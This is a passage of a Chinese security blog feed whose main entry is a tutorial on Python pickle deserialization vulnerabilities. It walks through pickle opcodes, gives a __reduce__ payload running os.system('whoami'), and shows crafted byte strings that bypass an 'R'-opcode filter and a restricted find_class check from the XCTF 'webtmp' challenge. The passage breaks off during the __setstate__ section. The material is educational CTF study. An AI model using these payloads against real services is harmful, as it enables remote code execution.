&lt;li&gt;&lt;strong&gt;AF_UNIX&lt;/strong&gt;：UNIX，用于单一的&lt;code&gt;UNIX&lt;/code&gt;系统进程之间的通信&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AF_INET(6)&lt;/strong&gt;：因特网，IPv4或IPv6&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;scoket_type&lt;/code&gt;可以是&lt;code&gt;SOCK_STREAM&lt;/code&gt;或&lt;code&gt;SOCK_DGRAM&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SOCK_STREAM&lt;/strong&gt;：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SOCK_DGRAM&lt;/strong&gt;：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;protocol&lt;/code&gt;参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化漏洞浅析</title>
    <link href="https://www.extrader.top/2020/04/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>https://www.extrader.top/2020/04/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2020-04-05T10:59:03.000Z</published>
    <updated>2020-07-14T10:44:22.560Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt="" loading="lazy"></p><p>以上例子简单的示范了python进行序列化和反序列化的操作</p><a id="more"></a><h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p><ul><li>反汇编一个已经被打包的字符串   <code>pickletools.dis</code></li><li>优化一个已经被打包的字符串       <code>pickletools.optimize</code></li><li>返回一个迭代器来供程序使用       <code>pickletools.genops</code></li></ul><p>一般我们使用前两个功能，可以先看一下效果：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python反序列化漏洞浅析/image-20200405205451074.png" style="zoom:80%;" / loading="lazy"><p>这就是反汇编的功能，解析那个字符串，然后告诉你这个字符串干了什么，每一行都是一条指令</p><p>序列化结构示意图（转）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt="" loading="lazy"></p><p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p><p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p><p>下面我们试图来序列化一个类</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#优化，消除未使用的PUT</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre><p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p><ul><li><strong>v0</strong> 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li><strong>v1</strong> 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li><strong>v2</strong> 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</li><li><strong>v3</strong> 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li></ul><p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p><pre class=" language-shell"><code class="language-shell">b'\x80\x03c__main__\ndairy\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.'        0: \x80 PROTO      3    2: c    GLOBAL     '__main__ dairy'   18: )    EMPTY_TUPLE   19: \x81 NEWOBJ   20: }    EMPTY_DICT   21: (    MARK   22: X        BINUNICODE 'date'   31: J        BININT     20202020   36: X        BINUNICODE 'text'   45: X        BINUNICODE '语言'   56: X        BINUNICODE 'tode'   65: ]        EMPTY_LIST   66: (        MARK   67: X            BINUNICODE '计'   75: X            BINUNICODE '算'   83: X            BINUNICODE '机'   91: e            APPENDS    (MARK at 66)   92: u        SETITEMS   (MARK at 21)   93: b    BUILD   94: .    STOPhighest protocol among opcodes = 2</code></pre><p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p><p>下面对优化后的代码一行一行的进行解释</p><pre><code>0: \x80 PROTO      3</code></pre><p><code>\x80</code>：版本(<code>protocol</code>)2后加入，机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。代表这个是依据3号协议序列化的字符串，随后这个操作结束。</p><pre><code>2: c    GLOBAL     &#39;__main__ dairy&#39;</code></pre><p><code>c</code>操作符：连续读取两个字符串<code>module</code>和<code>name</code>，规定以<code>\n</code>为分割给<code>find_class</code>方法，然后把<code>module.name</code>压入栈，现在读取到的是<code>main.dairy</code>，放入栈中，通常用来获取一个模块中的属性</p><pre><code>18: )    EMPTY_TUPLE</code></pre><p><code>)</code>操作符：把一个空的<code>tuple</code>压入当前栈</p><pre><code>19: \x81 NEWOBJ</code></pre><p><code>\x81</code>操作符：从栈中先弹出一个元素，记为<code>args</code>，再弹出一个元素记为<code>cls</code>，接下来执行<code>cls.new(cls,*args)</code>，然后把得到的东西压入栈，简单来说，从栈中弹出一个参数和一个<code>class</code>，然后利用这个参数实例化<code>class</code>，把得到的实例压入栈 </p><pre><code>20: }    EMPTY_DICT</code></pre><p><code>}</code>操作符：把一个空的<code>dict</code>压进栈</p><pre><code>21: (    MARK</code></pre><p>MARK操作符：这个操作符干的事称为<code>load_mark</code>，把当前栈这个整体，作为一个<code>list</code>，压进前序栈，把当前栈清空</p><pre><code>22: X        BINUNICODE &#39;date&#39;</code></pre><p><code>X</code>操作符：和V操作符一样是读入字符串压入堆栈，后面跟的四个字节代表字符串长度，如：<code>X\x04\x00\x00\x00date</code></p><pre><code>31: J        BININT     20202020</code></pre><p>J操作符：和X和V一样，只不过这个是4字节发的int型（个人理解）</p><pre><code>65: ]        EMPTY_LIST</code></pre><p><code>]</code>操作符，把一个空的<code>list</code>压进栈</p><pre><code>91: e            APPENDS    (MARK at 66)</code></pre><p>MARK结束，通过最上面的（66行）堆栈片扩展堆栈上的列表，简单来说就是形成一个列表（个人理解）</p><pre><code>92: u        SETITEMS   (MARK at 21)</code></pre><p>调用<code>pop_mark</code>，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态，从27行开始区分键值对，两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value</p><pre><code>93: b    BUILD</code></pre><p>把当前栈栈顶存进<code>state</code>，然后弹掉，把当前栈顶记为<code>inst</code>，然后弹掉，利用<code>state</code>这系列的值来更新实例<code>inst</code>，把得到的对象扔到当前栈，如果<code>inst</code>拥有<code>__setstate__</code>方法，则吧<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。实际上这里就有一个安全漏洞</p><pre><code>94: .    STOP</code></pre><p><code>.</code>：STOP指令，当前栈顶元素就是反序列化的最终结果，把他弹出</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><p><code>__reduce__</code>的指令码为<code>R</code>，他在反序列化的时候干了这么一件事</p><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                      <span class="token comment" spellcheck="true">#反序列化时执行，底层编码方法使用R指令码，</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(pickle.dumps(today))</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#优化，消除未使用的PUT</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre><p>得到以下结果</p><pre class=" language-shell"><code class="language-shell">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'    0: \x80 PROTO      3    2: c    GLOBAL     'nt system'   13: X    BINUNICODE 'whoami'   24: \x85 TUPLE1   25: R    REDUCE   26: .    STOPhighest protocol among opcodes = 2</code></pre><p>随后将序列化的内容反序列化</p><pre class=" language-python"><code class="language-python">b <span class="token operator">=</span> b<span class="token string">'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>hack <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b<span class="token punctuation">)</span></code></pre><p>随后就可得到命令执行的结果</p><h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># 定义内置方法,当判断两个对象的值是否相等时，触发此方法</span>        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade        <span class="token comment" spellcheck="true">#is比较地址</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>student<span class="token punctuation">(</span><span class="token string">'czj'</span><span class="token punctuation">,</span><span class="token string">'extrader'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">import</span> blue<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>    <span class="token keyword">return</span> <span class="token string">'well done!'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><code>blue.py</code>中：</p><pre class=" language-python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre><p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p><p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt="" loading="lazy"></p><p>但是在我们不知道blue.py的前提下如何绕过呢？这里就要用到我们的c指令码了</p><p>c指令码是专门用来获取一个全局变量的</p><p>先看一下反汇编后输出的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt="" loading="lazy"></p><p>利用c指令替换掉<code>czj</code>和<code>extrader</code>中两个字符串，将<code>pickle.dumps</code>后的<code>bytes</code>字符串中的<code>X\x03\x00\x00\x00czj</code>替换成<code>cblue\nname\n</code>，<code>X\x08\x00\x00\x00extrader</code>替换成<code>cblue\ngrade\n</code>随后base64编码后观察效果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt="" loading="lazy"></p><p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p><p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> blue<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>        <span class="token keyword">if</span> type<span class="token punctuation">(</span>restricted_loads<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token operator">not</span> student<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"false!"</span>        x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>        <span class="token keyword">return</span> <span class="token string">'well done!'</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Something wrong"</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><code>blue.py</code>中：</p><pre class=" language-python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre><p>题目部分来自XCTF高校战疫的一道题：webtmp</p><p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ student</code>则会引发错误然后退出，那该如何解决？</p><p>我们知道，通过GLOBAL引入的变量，可以看作是原变量的引用，<strong>当我们在栈上修改它的值</strong>，会导致原变量也被修改！思路如下：</p><ul><li>通过<code>__main__.blue</code>引入这一个<code>module</code>，由于命名空间还在main内，故不会拦截，也就是说，在<code>__main__</code>上再新构造一个模块，用来对数据进行改写</li><li>把一个<code>dict</code>压进栈，内容是<code>{&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;}</code></li><li>执行<code>BUILD</code>指令，会改写<code>__main__.blue.name</code>和<code>__main__.blue.grade</code>，到这里<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li><li>弹掉栈顶，现在栈变成空的</li><li>照抄正常的Student序列化之后的字符串，压入一个正常的<code>student</code>对象，<code>name</code>和<code>grade</code>分别是<code>&#39;B&#39;</code>和<code>&#39;B&#39;</code>由于</li></ul><p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p><p><code>payload</code>如下：</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nblue\n}(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81}(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.'</span></code></pre><p>其中q指令可省略</p><p>把过程输出执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt="" loading="lazy"></p><p>可看到成功绕过了判断</p><h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p><p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__  <span class="token keyword">def</span> <span class="token function">__setstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being unpickled with these values:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>__dict__ <span class="token operator">=</span> d     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">3</span>f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>代码执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt="" loading="lazy"></p><p>可看到<code>pickle</code>时执行了<code>__getstate__</code>方法，<code>unpickle</code>时执行了<code>__setstate__</code>方法，且使用了<code>__getstate__</code>方法返回的值</p><p>如果当原对象没有<code>__setstate__</code>这个方法的时候，如果我们构造了一个<code>{&#39;__setstate__&#39;: 